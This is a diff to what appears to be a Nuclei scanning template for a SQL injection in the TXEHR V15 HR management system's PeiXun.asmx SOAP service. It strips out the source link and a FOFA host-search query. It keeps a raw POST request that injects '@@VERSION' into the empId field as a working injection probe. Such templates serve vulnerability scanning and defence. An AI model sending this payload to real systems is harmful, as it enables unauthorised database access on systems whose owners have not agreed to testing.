@@ -3,12 +3,8 @@ info:
   name: 同享人力资源管理系统-TXEHR V15 PeiXun.asmx SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wg2fvbo0lf4gnkdf'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: wg2fvbo0lf4gnkdf
-    fofa: body="/Assistant/Default.aspx"
 http:
 - raw:
   - "POST /MobileService/PeiXun.asmx HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml; charset=utf-8\nContent-Length: length\nSOAPAction: \"http://tempuri.org/GetPeiXunRecord\"\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n    <GetPeiXunRecord xmlns=\"http://tempuri.org/\">\n      <company></company>\n      <empId>@@VERSION</empId>\n      <pageIndex>1</pageIndex>\n      <size>10</size>\n    </GetPeiXunRecord>\n  </soap:Body>\n</soap:Envelope>"
